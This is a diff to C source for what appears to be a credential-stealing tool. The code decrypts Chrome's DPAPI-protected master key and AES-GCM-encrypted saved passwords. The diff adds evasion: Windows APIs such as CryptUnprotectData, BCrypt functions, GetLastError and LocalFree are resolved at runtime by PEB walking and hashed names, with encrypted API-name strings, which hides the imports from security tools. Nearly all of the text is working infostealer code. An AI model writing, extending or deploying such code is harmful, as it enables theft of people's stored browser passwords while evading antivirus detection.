@@ -20,6 +20,14 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
+/* PEB-walk includes for runtime API resolution */
+#include "bcrypt_peb.h"
+#include "crypt32_peb.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
+
 /* MinGW BCrypt compatibility — define missing constants and types */
 #ifndef BCRYPT_SHA1_ALGORITHM
 #define BCRYPT_SHA1_ALGORITHM L"SHA1"
@@ -106,6 +114,25 @@ static void *compat_memmem(const void *haystack, size_t haystack_len,
 }
 #define memmem compat_memmem
 
+/* File-local PEB-walk for kernel32 misc APIs (GetLastError, LocalFree) */
+typedef DWORD (WINAPI *pGetLastError_fn)(void);
+typedef HLOCAL (WINAPI *pLocalFree_fn)(HLOCAL);
+static struct { pGetLastError_fn pGLE; pLocalFree_fn pLF; int ready; } g_k32_misc;
+static int ensure_k32_misc(void) {
+    if (g_k32_misc.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_GetLastError, ENC_GETLASTERROR_LEN, fn);
+    g_k32_misc.pGLE = (pGetLastError_fn)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_LocalFree, ENC_LOCALFREE_LEN, fn);
+    g_k32_misc.pLF = (pLocalFree_fn)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_k32_misc.pGLE || !g_k32_misc.pLF) return 0;
+    g_k32_misc.ready = 1;
+    return 1;
+}
+
 #else
 /* Linux stubs — for development/testing only */
 #include <openssl/evp.h>
@@ -154,12 +181,16 @@ int chrome_decrypt_dpapi_key(const unsigned char *encrypted_key, size_t len,
         return -1;
     }
 
+    const crypt32_api_t *c32 = mirage_crypt32_api();
+    if (!c32) { dbg_printf("[!] crypt32 PEB resolution failed\n"); return -1; }
+
     DATA_BLOB input, output;
     input.cbData = (DWORD)(len - offset - 1);
     input.pbData = (BYTE *)(encrypted_key + offset + 1);
 
-    if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
-        dbg_printf("[!] CryptUnprotectData failed: GetLastError=%lu\n", GetLastError());
+    if (!c32->pUnprotect(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+        if (ensure_k32_misc())
+            dbg_printf("[!] CryptUnprotectData failed: GetLastError=%lu\n", g_k32_misc.pGLE());
         return -1;
     }
 
@@ -168,7 +199,7 @@ int chrome_decrypt_dpapi_key(const unsigned char *encrypted_key, size_t len,
     memcpy(out, output.pbData, copy);
     *out_len = copy;
 
-    LocalFree(output.pbData);
+    if (ensure_k32_misc()) g_k32_misc.pLF(output.pbData);
     return 0;
 }
 
@@ -194,20 +225,23 @@ int chrome_derive_key(unsigned char *out32) {
     static const int iterations = 1;
 
 #ifdef _WIN32
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return -1;
+
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     NTSTATUS status;
 
-    status = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_SHA1_ALGORITHM,
-                                         NULL, BCRYPT_ALG_FLAG_HMAC_FLAG);
+    status = bc->pOpen(&hAlgo, BCRYPT_SHA1_ALGORITHM,
+                       NULL, BCRYPT_ALG_FLAG_HMAC_FLAG);
     if (status < 0) return -1;
 
-    status = BCryptDeriveKeyPBKDF2(hAlgo,
-                                   (PUCHAR)"", 0,             /* empty password */
-                                   (PUCHAR)salt, sizeof(salt) - 1,
-                                   iterations,
-                                   out32, 32,
-                                   0);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    status = bc->pDerive(hAlgo,
+                         (PUCHAR)"", 0,             /* empty password */
+                         (PUCHAR)salt, sizeof(salt) - 1,
+                         iterations,
+                         out32, 32,
+                         0);
+    bc->pClose(hAlgo, 0);
     return (status >= 0) ? 0 : -1;
 
 #else
@@ -241,18 +275,21 @@ int chrome_decrypt_password(const unsigned char *encrypted, size_t len,
 
     if (out_max < ct_len) return -1;
 
+    const bcrypt_api_t *bc = mirage_bcrypt_api();
+    if (!bc) return -1;
+
     BCRYPT_ALG_HANDLE hAlgo = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     NTSTATUS status;
 
-    status = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_AES_GCM_ALGORITHM,
-                                         NULL, 0);
+    status = bc->pOpen(&hAlgo, BCRYPT_AES_GCM_ALGORITHM,
+                       NULL, 0);
     if (status < 0) return -1;
 
-    status = BCryptSetProperty(hAlgo, BCRYPT_CHAINING_MODE,
-                               (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
-                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-    if (status < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    status = bc->pSetProp(hAlgo, BCRYPT_CHAINING_MODE,
+                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
+                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    if (status < 0) { bc->pClose(hAlgo, 0); return -1; }
 
     BCRYPT_KEY_DATA_BLOB_HEADER keyBlob;
     keyBlob.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
@@ -261,12 +298,12 @@ int chrome_decrypt_password(const unsigned char *encrypted, size_t len,
 
     size_t blob_size = sizeof(keyBlob) + 32;
     unsigned char *blob = (unsigned char *)malloc(blob_size);
-    if (!blob) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
+    if (!blob) { bc->pClose(hAlgo, 0); return -1; }
     memcpy(blob, &keyBlob, sizeof(keyBlob));
     memcpy(blob + sizeof(keyBlob), key32, 32);
 
-    status = BCryptGenerateSymmetricKey(hAlgo, &hKey, NULL, 0,
-                                        blob, (ULONG)blob_size, 0);
+    status = bc->pGenKey(hAlgo, &hKey, NULL, 0,
+                         blob, (ULONG)blob_size, 0);
     free(blob);
 
     /* Build auth info (empty for Chrome) and IV struct */
@@ -278,16 +315,16 @@ int chrome_decrypt_password(const unsigned char *encrypted, size_t len,
     authInfo.cbTag = 16;
 
     ULONG resultLen = 0;
-    status = BCryptDecrypt(hKey,
-                           (PUCHAR)ciphertext, (ULONG)ct_len,
-                           &authInfo,
-                           NULL, 0,
-                           out, (ULONG)out_max,
-                           &resultLen,
-                           0);
+    status = bc->pDecrypt(hKey,
+                          (PUCHAR)ciphertext, (ULONG)ct_len,
+                          &authInfo,
+                          NULL, 0,
+                          out, (ULONG)out_max,
+                          &resultLen,
+                          0);
 
-    BCryptDestroyKey(hKey);
-    BCryptCloseAlgorithmProvider(hAlgo, 0);
+    bc->pDestroyKey(hKey);
+    bc->pClose(hAlgo, 0);
 
     *out_len = (size_t)resultLen;
     return 0;
